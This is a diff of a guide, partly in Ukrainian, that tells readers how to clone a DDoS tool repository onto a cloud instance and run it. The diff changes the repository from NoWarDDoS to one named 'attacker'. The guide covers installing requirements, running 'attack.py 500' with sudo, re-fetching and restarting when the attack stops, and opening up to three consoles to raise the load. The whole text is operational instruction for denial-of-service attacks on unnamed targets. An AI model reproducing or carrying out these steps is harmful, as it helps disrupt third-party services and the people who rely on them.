@@ -83,38 +83,38 @@
 
 
     @instance-2:~$ su apps
-    @instance-2:~$ apps@instance-2:~$ sudo git clone https://github.com/AlexTrushkovsky/NoWarDDoS.git
+    @instance-2:~$ apps@instance-2:~$ sudo git clone https://github.com/Luzhnuy/attacker.git
 
 ## 5. Prepare and attack:
 
     
 
-    @instance-2:~$ cd NoWarDDoS
-    @instance-2:~/NoWarDDoS$ pip3 install -r requirements.txt
-    @instance-2:~/NoWarDDoS$ sudo python3 attack.py 500
+    @instance-2:~$ cd attacker
+    @instance-2:~/attacker$ pip3 install -r requirements.txt
+    @instance-2:~/attacker$ sudo python3 attack.py 500
 
 ## After exit:
 
     @instance-2:~$ su apps
     	-> Password: 
-    @instance-2:~$ cd NoWarDDoS
-    @instance-2:~/NoWarDDoS$ sudo git fetch
-    @instance-2:~/NoWarDDoS$ sudo python3 attack.py 500
+    @instance-2:~$ cd attacker
+    @instance-2:~/attacker$ sudo git fetch
+    @instance-2:~/attacker$ sudo python3 attack.py 500
     
 
 ##
 Залишаєте на певний час, якщо побачити що більше не атакується:
 
 	СTRL-C
-    @instance-2:~$ cd NoWarDDoS
-    @instance-2:~/NoWarDDoS$ sudo git fetch
-    @instance-2:~/NoWarDDoS$ sudo python3 attack.py 500
+    @instance-2:~$ cd attacker
+    @instance-2:~/attacker$ sudo git fetch
+    @instance-2:~/attacker$ sudo python3 attack.py 500
 
 
 Можете відкривати декілька консолей щоб збільшити навантаження (не більше 3):
     
     @instance-2:~$ su apps
     	-> Password: 
-    @instance-2:~$ cd NoWarDDoS
-    @instance-2:~/NoWarDDoS$ sudo git fetch
-    @instance-2:~/NoWarDDoS$ sudo python3 attack.py 500
+    @instance-2:~$ cd attacker
+    @instance-2:~/attacker$ sudo git fetch
+    @instance-2:~/attacker$ sudo python3 attack.py 500
